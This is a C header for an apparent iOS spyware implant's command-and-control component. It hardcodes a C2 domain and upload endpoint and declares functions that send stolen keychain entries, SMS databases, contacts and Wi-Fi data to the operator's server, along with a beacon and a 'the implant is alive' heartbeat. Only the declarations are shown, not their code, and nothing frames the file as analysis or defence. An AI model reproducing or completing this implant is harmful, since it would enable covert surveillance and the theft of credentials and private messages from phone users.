#ifndef C2_H
#define C2_H
#include <stdint.h>
#include <stddef.h>

#define C2_DOMAIN    "testios.systeminfo.vip"
#define C2_PORT      443
#define C2_USE_HTTPS 1          /* 1 = HTTPS, 0 = HTTP */
#define C2_UPLOAD    "/upload"

/*
 * Payload version — bump the sub-version on every build that changes dylib
 * behaviour so the operator can confirm which version is running on-device.
 * Format: "<major>.<minor>".  Major = breaking change, minor = incremental.
 */
#define PAYLOAD_VERSION "1.2"

/*
 * upload_to_c2 — HTTP(S) POST one record to the Go /upload endpoint.
 *   category    : e.g. "keychain", "sms", "contacts", "wifi", "system"
 *   path        : source path on device, e.g. "/var/mobile/Library/SMS/sms.db"
 *   description : human-readable label
 *   b64data     : base64-encoded payload bytes
 */
void upload_to_c2(const char *category, const char *path,
                  const char *description, const char *b64data);

/*
 * upload_beacon — lightweight synchronous probe (5-second timeout).
 * Safe to call directly from process() in Stage3's calling context.
 * Reports: version, iOS build, process name, PID.
 * If this appears in server logs, Foundation + NSURLSession work from the dylib.
 * If it does NOT appear, something below ObjC level is broken.
 */
void upload_beacon(void);

/* One-shot device info upload (iOS version, model, kernel version) */
void upload_device_info(void);

/* Heartbeat — lets C2 know the implant is alive */
void c2_heartbeat(void);

/* Legacy stub kept for ABI compat with any old callers */
void send_to_c2(const uint8_t *data, size_t len);

#endif /* C2_H */
